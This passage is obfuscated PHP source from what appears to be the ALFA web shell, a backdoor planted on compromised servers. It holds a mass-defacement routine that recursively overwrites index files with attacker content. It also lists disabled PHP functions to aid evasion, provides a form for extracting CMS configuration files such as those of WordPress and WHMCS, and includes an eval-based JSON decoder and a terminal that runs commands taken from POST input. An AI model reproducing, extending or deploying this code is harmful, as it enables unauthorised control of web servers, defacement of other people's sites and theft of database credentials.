while (($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = @readdir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc)) !== false){
if($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac == '..' || $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac == '.')continue;
$bftivamya48d2779dabc70e43a053fc28dc9817c=$ofvepnxk736007832d2167baaae763fd3a3f3cf1.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac;
if($ftqxgdqada12455c4a8ca8fc5d88a2b95fae6b8c == $bftivamya48d2779dabc70e43a053fc28dc9817c)continue;
if(@is_dir($bftivamya48d2779dabc70e43a053fc28dc9817c)){
Alfa_ReadDir($bftivamya48d2779dabc70e43a053fc28dc9817c,$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce,$halrheeadb3b348bb48b63e468cf5a6355bd379a);
}else{
if(!@is_writable($bftivamya48d2779dabc70e43a053fc28dc9817c))continue;
if(!@is_readable($bftivamya48d2779dabc70e43a053fc28dc9817c))continue;
Alfa_Rewriter($bftivamya48d2779dabc70e43a053fc28dc9817c,$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$halrheeadb3b348bb48b63e468cf5a6355bd379a,$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce);
}
}
closedir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc);
}else{__alert('<font color="red">Error In OpenDir...</font>');}
}else{__alert('<font color="red">DefPage File NotFound...</font>');}
}else{__alert('<font color="red">Directory is not Readable...</font>');}
}else{__alert('<font color="red">Mass Dir is Invalid Dir...</font>');}
}else{__alert('<font color="red">Dir is Empty...</font>');}
}
echo '</div>';
alfafooter();
}
function Alfa_ReadDir($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce='',$halrheeadb3b348bb48b63e468cf5a6355bd379a=''){
if(!@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) return false;
if (@is_dir($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) {
if ($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc = @opendir($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) {
while(($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=readdir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc))!==false) {
if($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac == '..' || $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac == '.')continue;
$bftivamya48d2779dabc70e43a053fc28dc9817c=$ofvepnxk736007832d2167baaae763fd3a3f3cf1.'/'.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac;
if(@is_readable($bftivamya48d2779dabc70e43a053fc28dc9817c)&&@is_dir($bftivamya48d2779dabc70e43a053fc28dc9817c))Alfa_ReadDir($bftivamya48d2779dabc70e43a053fc28dc9817c,$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce,$halrheeadb3b348bb48b63e468cf5a6355bd379a);
if(@is_file($bftivamya48d2779dabc70e43a053fc28dc9817c)){
if(!@is_readable($bftivamya48d2779dabc70e43a053fc28dc9817c))continue;
Alfa_Rewriter($bftivamya48d2779dabc70e43a053fc28dc9817c,$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$halrheeadb3b348bb48b63e468cf5a6355bd379a,$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce);
}
}
closedir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc);
}
}
}
function Alfa_Rewriter($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$halrheeadb3b348bb48b63e468cf5a6355bd379a,$cnspfppq6f8f57715090da2632453988d9a1501b='index'){
if(!@is_writable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) return false;
if(!@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) return false;
$halrheeadb3b348bb48b63e468cf5a6355bd379a=@file_get_contents($halrheeadb3b348bb48b63e468cf5a6355bd379a);
if($cnspfppq6f8f57715090da2632453988d9a1501b == 'index'){
$hewmqjemad9d3113a87b9814d2fe1795bb4e1a73 = array('index.php','index.htm','index.html','default.asp','default.aspx','index.asp','index.aspx','index.js');
if(in_array(strtolower($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac),$hewmqjemad9d3113a87b9814d2fe1795bb4e1a73)){
@file_put_contents($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$halrheeadb3b348bb48b63e468cf5a6355bd379a);
echo @is_file($ofvepnxk736007832d2167baaae763fd3a3f3cf1)?$ofvepnxk736007832d2167baaae763fd3a3f3cf1."<b><font color='red'>DeFaced...</b></font><br>" : '';
}
}elseif($cnspfppq6f8f57715090da2632453988d9a1501b=='all'){
@file_put_contents($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$halrheeadb3b348bb48b63e468cf5a6355bd379a);
echo @is_file($ofvepnxk736007832d2167baaae763fd3a3f3cf1)?$ofvepnxk736007832d2167baaae763fd3a3f3cf1."  <b><font color='red'>DeFaced...</b></font><br>" : '';
}
}
function alfaGetDisFunc(){
alfahead();
echo '<div class="header">';
$seoudwvg0b30ee767bb8b426744976e10337f56e = @ini_get('disable_functions');
$fwekvgvg03c7c0ace395d80182db07ae2c30f034 = explode(',',$seoudwvg0b30ee767bb8b426744976e10337f56e);
$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = array_unique($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
echo '<center><br><b><font color="#7CFC00">Disable Functions</font></b><pre><table border="1"><tr><td align="center" style="background-color: green;color: white;width:5%">#</td><td align="center" style="background-color: green;color: white;">Func Name</td></tr>';
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=1;
foreach($npviloqa8fa14cdd754f91cc6554c9e71929cce7 as $fwekvgvg03c7c0ace395d80182db07ae2c30f034){
$fwekvgvg03c7c0ace395d80182db07ae2c30f034=trim($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
if(function_exists($fwekvgvg03c7c0ace395d80182db07ae2c30f034)||!is_callable($fwekvgvg03c7c0ace395d80182db07ae2c30f034))continue;
echo '<tr><td align="center" style="background-color: black;">'.$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741.'</td>';
echo '<td align="center" style="background-color: black;"><a style="text-decoration: none;" target="_blank" href="http://php.net/manual/en/function.'.str_replace('_','-',$fwekvgvg03c7c0ace395d80182db07ae2c30f034).'.php"><span class="disable_functions"><b>'.$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'</b></span></a></td>';
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++;
}
echo '</table></center>';
echo '</div>';
alfafooter();
}
function Alfa_Create_A_Tag($psxclsvx418c5509e2171d55b0aee5c2ea4442b5,$zedzftuyb2021c4149dfd5dc85c88823b7df34bd){
$opidwbkuc642c4f3605cc8dc9ae17036b2b66e15 = array();
foreach($zedzftuyb2021c4149dfd5dc85c88823b7df34bd as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){
echo '<a href=javascript:void(0) onclick="g(\''.$psxclsvx418c5509e2171d55b0aee5c2ea4442b5.'\',';
for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<=$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf[1]-1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++)$opidwbkuc642c4f3605cc8dc9ae17036b2b66e15[] = 'null';
$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = implode(',',$opidwbkuc642c4f3605cc8dc9ae17036b2b66e15);
echo $npviloqa8fa14cdd754f91cc6554c9e71929cce7.',\''.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf[0].'\');return false;">| '.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.' | </a>';
unset($opidwbkuc642c4f3605cc8dc9ae17036b2b66e15);
}
}
function Alfa_Searcher($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $uzehrcsaabf77184f55403d75b9d51d79162a7ca, $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce) {
if(@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
if($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'all')$uzehrcsaabf77184f55403d75b9d51d79162a7ca = '*';
if($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'dirs')$uzehrcsaabf77184f55403d75b9d51d79162a7ca = '*';
$ghevmcuze3c14af3892a4ccb759e0e4974df197c = @glob("$ofvepnxk736007832d2167baaae763fd3a3f3cf1/*.$uzehrcsaabf77184f55403d75b9d51d79162a7ca");
$ijcmoisj6fb69e88996e72e8fc50e13f205ca4fd  = @glob("$ofvepnxk736007832d2167baaae763fd3a3f3cf1/*", GLOB_ONLYDIR);
$vefebpqna0bc9791616492b14e330a7e0ef35512 = array();
foreach ($ijcmoisj6fb69e88996e72e8fc50e13f205ca4fd as $ofvepnxk736007832d2167baaae763fd3a3f3cf1) {
if(!@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)||@is_link($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) continue;
@Alfa_Searcher($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $uzehrcsaabf77184f55403d75b9d51d79162a7ca, $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce);
}
switch($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce){
case "files":
foreach ($ghevmcuze3c14af3892a4ccb759e0e4974df197c as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
if(@is_writable($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)){
echo "$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac<br>";
}
}
break;
case "dirs":
foreach ($ghevmcuze3c14af3892a4ccb759e0e4974df197c as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
if(@is_writable(dirname($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)) && !in_array(dirname($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac), $vefebpqna0bc9791616492b14e330a7e0ef35512)){
echo dirname($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac).'<br>';
$vefebpqna0bc9791616492b14e330a7e0ef35512[] = dirname($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
}
}
break;
case "all":
foreach ($ghevmcuze3c14af3892a4ccb759e0e4974df197c as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
echo $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac.'<br>';
}
break;
}
unset($vefebpqna0bc9791616492b14e330a7e0ef35512);
}
}
function AlfaiFrameCreator($npviloqa8fa14cdd754f91cc6554c9e71929cce7,$krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc='100%',$txtdplwpb435e227d5dd201e1768b2bcb2e0aa81='600px'){
return('<iframe src="'.__ALFA_DATA_FOLDER__."/".$npviloqa8fa14cdd754f91cc6554c9e71929cce7.'" width="'.$krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc.'" height="'.$txtdplwpb435e227d5dd201e1768b2bcb2e0aa81.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4;
public $fkkfyomj83647c700b7d38852412f4f946f00c88;
public $dhozuljc07f5d2d550d5961d1dd0984fe666a2f6;
public $frplgryj9cb2b16f003927f1e0c694638b1421f4;
public $eevdbtrw431387eb7262e1cfc79b125eb8a67c60;
public $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
public $tmhkvnyqf9d5c16a7f42203f8c195432354a3271 = true;
public $oijsoqia40f49da408d83a872c3a9266ab69d89c = true;
function __construct($jxucdtmn55e7dd3016ce4ac57b9a0f56af12f7c2=false,$dhozuljc07f5d2d550d5961d1dd0984fe666a2f6='gzip',$eevdbtrw431387eb7262e1cfc79b125eb8a67c60=''){
if(!extension_loaded('curl')){$oijsoqia40f49da408d83a872c3a9266ab69d89c = false;return false;}
$this->$ryiulmjo8887138ae202be73d41689c088a543a5[] = 'Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg';
$this->$ryiulmjo8887138ae202be73d41689c088a543a5[] = 'Connection: Keep-Alive';
$this->$ryiulmjo8887138ae202be73d41689c088a543a5[] = 'Content-type: application/x-www-form-urlencoded;charset=UTF-8';
$this->$pwhhxsls5de4de01235495bf056e1b9fc3fad3f3 = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36)';
$this->$kniieicdb8c1606a1d22fd80528b7afcd82602a9 = ALFA_TEMPDIR.'/Alfa_cookies.txt';
$this->$dbpitbesf27e33f2e5d8312e8630a58e6fe25fc5=$dhozuljc07f5d2d550d5961d1dd0984fe666a2f6;
$this->$lztociaya3f222e616de01ad575d2532fd68b591=$eevdbtrw431387eb7262e1cfc79b125eb8a67c60;
$this->$yiieagkk0f6be6c64e1c8334a141527342d3b917=$jxucdtmn55e7dd3016ce4ac57b9a0f56af12f7c2;
if($this->$yiieagkk0f6be6c64e1c8334a141527342d3b917)$this->cookie($this->$kniieicdb8c1606a1d22fd80528b7afcd82602a9);
}
function cookie($frplgryj9cb2b16f003927f1e0c694638b1421f4) {
if (_alfa_file_exists($frplgryj9cb2b16f003927f1e0c694638b1421f4,false)) {
$this->$yfwwqwqlddef6064ad24da83167da20bd487aba1=$frplgryj9cb2b16f003927f1e0c694638b1421f4;
}else{
@fopen($frplgryj9cb2b16f003927f1e0c694638b1421f4,'w') or die($this->error('The cookie file could not be opened.'));
$this->$yfwwqwqlddef6064ad24da83167da20bd487aba1=$frplgryj9cb2b16f003927f1e0c694638b1421f4;
@fclose($this->$yfwwqwqlddef6064ad24da83167da20bd487aba1);
}
}
function Send($fefubzei572d4e421e5e6b9bc11d815e8a027112,$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce="get",$sfmsaibm8d777f385d3dfec8815d20f7496026dc=""){
if(!$this->$cdyedswo52a07ca1700795bb808d65d1bb6187a3){return false;}
$kuiuelsn5075140835d0bc504791c76b04c33d2b = curl_init($fefubzei572d4e421e5e6b9bc11d815e8a027112);
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_HTTPHEADER, $this->$ryiulmjo8887138ae202be73d41689c088a543a5);
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_HEADER, 0);
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_USERAGENT, $this->$pwhhxsls5de4de01235495bf056e1b9fc3fad3f3);
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_ENCODING , $this->$dbpitbesf27e33f2e5d8312e8630a58e6fe25fc5);
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_TIMEOUT, 30);
if($this->$dojqcedr54a2bf8c09ace67d3513aaa1aa7aa0f3){
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_SSL_VERIFYPEER ,false);
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_SSL_VERIFYHOST,false);
}
if($this->$yiieagkk0f6be6c64e1c8334a141527342d3b917){
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_COOKIEFILE, $this->$kniieicdb8c1606a1d22fd80528b7afcd82602a9);
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_COOKIEJAR, $this->$kniieicdb8c1606a1d22fd80528b7afcd82602a9);
}
if($this->$lztociaya3f222e616de01ad575d2532fd68b591){
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_PROXY, $this->$lztociaya3f222e616de01ad575d2532fd68b591);
}
if($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce=='post'){
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_POSTFIELDS, $sfmsaibm8d777f385d3dfec8815d20f7496026dc);
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_POST, 1);
curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
}
$qidcygige70c4df10ef0983b9c8c31bd06b2a2c3 = @curl_exec($kuiuelsn5075140835d0bc504791c76b04c33d2b);
curl_close($kuiuelsn5075140835d0bc504791c76b04c33d2b);
return $qidcygige70c4df10ef0983b9c8c31bd06b2a2c3;
}
function error($kowlomtecb5e100e5a9a3e7f6d1fd97512215282) {
echo "<center><div style='width:500px;border: 3px solid #FFEEFF; padding: 3px; background-color: #FFDDFF;font-family: verdana; font-size: 10px'><b>cURL Error</b><br>$kowlomtecb5e100e5a9a3e7f6d1fd97512215282</div></center>";
die;
}
}
function getConfigHtml($enqiaukc570d99e4c85914470d914170d1e95144){
$mveevork9a0364b9e99bb480dd25e1f0284c8555 = '';
$kkhtyukm56ced8824ba8ceb4e2e946b5bea40a12 = array("wp" => "WordPress", "vb" => "vBulletin", "whmcs" => "Whmcs", "joomla" => "Joomla", "phpnuke" => "PHPNuke","phpbb"=>"PHPBB","mybb"=>"MyBB","drupal"=>"Drupal","smf"=>"SMF");
$mveevork9a0364b9e99bb480dd25e1f0284c8555 .= "<form class='getconfig' onSubmit='g(\"GetConfig\",null,this.cms.value,this.path.value,this.getAttribute(\"base_id\"));return false;'><div class='txtfont'>Cms: </div> <select name='cms'style='width:100px;'>";
foreach($kkhtyukm56ced8824ba8ceb4e2e946b5bea40a12 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){
$mveevork9a0364b9e99bb480dd25e1f0284c8555 .= "<option value='{$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d}' ".($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d==$enqiaukc570d99e4c85914470d914170d1e95144?'selected=selected':'').">{$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf}</option>";
}
$mveevork9a0364b9e99bb480dd25e1f0284c8555 .= "</select> <div class='txtfont'>Path(installed cms/Config): </div> <input type='text' name='path' value='".$_SERVER['DOCUMENT_ROOT']."/' size='30' /> <button class='button'>GetConfig</button>";
$mveevork9a0364b9e99bb480dd25e1f0284c8555 .= "</form>";
return $mveevork9a0364b9e99bb480dd25e1f0284c8555;
}
if (!function_exists('json_encode')){
    function json_encode($gtvtgpki0cc175b9c0f1b6a831c399e269772661=false){
        if (is_null($gtvtgpki0cc175b9c0f1b6a831c399e269772661)) return 'null';
        if ($gtvtgpki0cc175b9c0f1b6a831c399e269772661 === false) return 'false';
        if ($gtvtgpki0cc175b9c0f1b6a831c399e269772661 === true) return 'true';
        if (is_scalar($gtvtgpki0cc175b9c0f1b6a831c399e269772661))
        {
            if (is_float($gtvtgpki0cc175b9c0f1b6a831c399e269772661))
            {
                return floatval(str_replace(",", ".", strval($gtvtgpki0cc175b9c0f1b6a831c399e269772661)));
            }

            if (is_string($gtvtgpki0cc175b9c0f1b6a831c399e269772661))
            {
                static $omtqmfrf3e8d1e57de61ed80d6d24038925533a9 = array(array("\\", "/", "\n", "\t", "\r", "\b", "\f", '"'), array('\\\\', '\\/', '\\n', '\\t', '\\r', '\\b', '\\f', '\"'));
                return '"' . str_replace($omtqmfrf3e8d1e57de61ed80d6d24038925533a9[0], $omtqmfrf3e8d1e57de61ed80d6d24038925533a9[1], $gtvtgpki0cc175b9c0f1b6a831c399e269772661) . '"';
            }
            else
            return $gtvtgpki0cc175b9c0f1b6a831c399e269772661;
        }
        $wrpilbknf42df43db20261ef07af483a86fdc030 = true;
        for ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 0, reset($gtvtgpki0cc175b9c0f1b6a831c399e269772661); $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < count($gtvtgpki0cc175b9c0f1b6a831c399e269772661); $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++, next($gtvtgpki0cc175b9c0f1b6a831c399e269772661))
        {
            if (key($gtvtgpki0cc175b9c0f1b6a831c399e269772661) !== $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741)
            {
                $wrpilbknf42df43db20261ef07af483a86fdc030 = false;
                break;
            }
        }
        $nmxeqhvab4a88417b3d0170d754c647c30b7216a = array();
        if ($wrpilbknf42df43db20261ef07af483a86fdc030)
        {
            foreach ($gtvtgpki0cc175b9c0f1b6a831c399e269772661 as $hvlrcxnj9e3669d19b675bd57058fd4664205d2a) $nmxeqhvab4a88417b3d0170d754c647c30b7216a[] = json_encode($hvlrcxnj9e3669d19b675bd57058fd4664205d2a);
            return '[' . join(',', $nmxeqhvab4a88417b3d0170d754c647c30b7216a) . ']';
        }
        else
        {
            foreach ($gtvtgpki0cc175b9c0f1b6a831c399e269772661 as $damiszkt8ce4b16b22b58894aa86c421e8759df3 => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a) $nmxeqhvab4a88417b3d0170d754c647c30b7216a[] = json_encode($damiszkt8ce4b16b22b58894aa86c421e8759df3).':'.json_encode($hvlrcxnj9e3669d19b675bd57058fd4664205d2a);
            return '{' . join(',', $nmxeqhvab4a88417b3d0170d754c647c30b7216a) . '}';
        }
    }
}
if ( !function_exists('json_decode') ){
function json_decode($enjzynvd466deec76ecdf5fca6d38571f6324d54, $vmwhayoqf1f713c9e000f5d3f280adbd124df4f5=true){
    $iolthodr06d4cd63bde972fc66a0aed41d2f5c51 = false;
    $vemvtkqkc68271a63ddbc431c307beb7d2918275 = '$x=';
    for ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<strlen($enjzynvd466deec76ecdf5fca6d38571f6324d54); $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++)
    {
        if (!$iolthodr06d4cd63bde972fc66a0aed41d2f5c51)
        {
            if ($enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] == '{' || $enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] == '['){$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= ' array(';}
            else if ($enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] == '}' || $enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] == ']'){$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= ')';}
            else if ($enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] == ':'){$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= '=>';}
            else {$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= $enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741];}
        }
        else $vemvtkqkc68271a63ddbc431c307beb7d2918275 .= $enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741];
        if ($enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] == '"')    $iolthodr06d4cd63bde972fc66a0aed41d2f5c51 = !$iolthodr06d4cd63bde972fc66a0aed41d2f5c51;
    }
    eval($vemvtkqkc68271a63ddbc431c307beb7d2918275 . ';');
    return $fyyftmba9dd4e461268c8034f5c8564e155c67a6;
}
}
function alfaterminalExec(){
	$mevhntrj9003d1df22eb4d3820015070385194c8 = "pwd";
	$pcwmqoeoe72814aaa963a3fa498930dcf0ed40fb = ";";
	if($GLOBALS['sys']!='unix'){
		$mevhntrj9003d1df22eb4d3820015070385194c8 = "cd";
		$pcwmqoeoe72814aaa963a3fa498930dcf0ed40fb = "&";
	}
	if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = "cd '".addslashes($_POST["c"])."'".$pcwmqoeoe72814aaa963a3fa498930dcf0ed40fb;}
	$ognvvcvxc5527cf904b1ac2e8e83d98e7f294001 = '';
	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$pcwmqoeoe72814aaa963a3fa498930dcf0ed40fb."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['alfa1'], $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc)){
		if(empty($ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[1])){
			$ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[1] = $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[2];
		}
		$ognvvcvxc5527cf904b1ac2e8e83d98e7f294001 = alfaEx("cd ".addslashes($ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[1]).$pcwmqoeoe72814aaa963a3fa498930dcf0ed40fb.$mevhntrj9003d1df22eb4d3820015070385194c8);
		$ognvvcvxc5527cf904b1ac2e8e83d98e7f294001 = str_replace("\\", "/", $ognvvcvxc5527cf904b1ac2e8e83d98e7f294001);
	}
	$vemvtkqkc68271a63ddbc431c307beb7d2918275 = alfaEx($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452.$_POST['alfa1'], true);
	$vemvtkqkc68271a63ddbc431c307beb7d2918275 = htmlspecialchars($vemvtkqkc68271a63ddbc431c307beb7d2918275);
	echo json_encode(array("output" => convertBash($vemvtkqkc68271a63ddbc431c307beb7d2918275), "path" => $ognvvcvxc5527cf904b1ac2e8e83d98e7f294001));
}
function convertBash($nndigmblc13367945d5d4c91047b3b50234aa7ab) {
    $yxcvqxqxabc20d7bde1df257f890e152af2e3470 = array(
        '[01;30m' => '<span style="color:black">',
        '[01;31m' => '<span style="color:red">',
        '[01;32m' => '<span style="color:green">',
        '[01;33m' => '<span style="color:yellow">',
        '[01;34m' => '<span style="color:blue">',
        '[01;35m' => '<span style="color:purple">',
        '[01;36m' => '<span style="color:cyan">',
        '[01;37m' => '<span style="color:white">',
        '[0m'   => '</span>'
    );
    $nfbgrlwk5734ea6261f125e8c8312dc0e1eb803a = str_replace(array_keys($yxcvqxqxabc20d7bde1df257f890e152af2e3470), $yxcvqxqxabc20d7bde1df257f890e152af2e3470, $nndigmblc13367945d5d4c91047b3b50234aa7ab);
    return $nfbgrlwk5734ea6261f125e8c8312dc0e1eb803a;
}
function alfadoActions(){
	$qfbxlugo26d40443ff695aa5ca38b91e8a4b7772 = false;
	if(!@chdir($_POST['c'])){
		$qfbxlugo26d40443ff695aa5ca38b91e8a4b7772 = true;
		$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7 = _alfa_can_runCommand(true,true);
	}
	if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode($_POST['alfa1']);
	if(isset($_POST['alfa2']))$_POST['alfa2'] = rawurldecode($_POST['alfa2']);
	$psxclsvx418c5509e2171d55b0aee5c2ea4442b5 = $_POST["alfa3"];
	if($psxclsvx418c5509e2171d55b0aee5c2ea4442b5 == "permission"){
		$xyksvzrf58f57b98cc8cfb81907179e9b4635762 = 0;
		$orvpxmpqca659200663cf654dc4410ed494451ee = $_POST["alfa2"];
		for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=strlen($orvpxmpqca659200663cf654dc4410ed494451ee)-1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741>=0;--$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741){
			$xyksvzrf58f57b98cc8cfb81907179e9b4635762 += (int)$orvpxmpqca659200663cf654dc4410ed494451ee[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]*pow(8, (strlen($orvpxmpqca659200663cf654dc4410ed494451ee)-$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741-1));
		}
		if(@chmod($_POST['alfa1'], $xyksvzrf58f57b98cc8cfb81907179e9b4635762)){
			echo("done");
		}else{
			echo("no");
		}
		return;
	}
	if($psxclsvx418c5509e2171d55b0aee5c2ea4442b5 == "rename" || $psxclsvx418c5509e2171d55b0aee5c2ea4442b5 == "move"){
		$qdtibsqye1811c0c73fb371dc3b92d7bbabfc584 = $_POST['alfa1'];
		if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772){
			$_POST['alfa1'] = $_POST["c"]."/".$_POST["alfa1"];
		}
		$_POST['alfa1'] = trim($_POST['alfa1']);
		$ykfrrysfb3101d8ff211f7523e7c281757437a55 = addslashes($_POST["alfa1"]);
		if($_POST["alfa3"] == "rename"){
			$_POST['alfa2'] = basename($_POST['alfa2']);
		}
		if(!empty($_POST['alfa2'])){
			$cttyjrbbaca66cb949843e056d7268641b9b74cc = false;
			if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
				if(_alfa_is_writable($_POST['alfa1'])){
					$cttyjrbbaca66cb949843e056d7268641b9b74cc = true;
					$ykfrrysfb3101d8ff211f7523e7c281757437a55 = addslashes($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584);
					alfaEx("cd '".addslashes($_POST['c'])."';mv '".$ykfrrysfb3101d8ff211f7523e7c281757437a55."' '".addslashes($_POST['alfa2'])."'");
				}
			}
			if(!file_exists($_POST['alfa2'])){
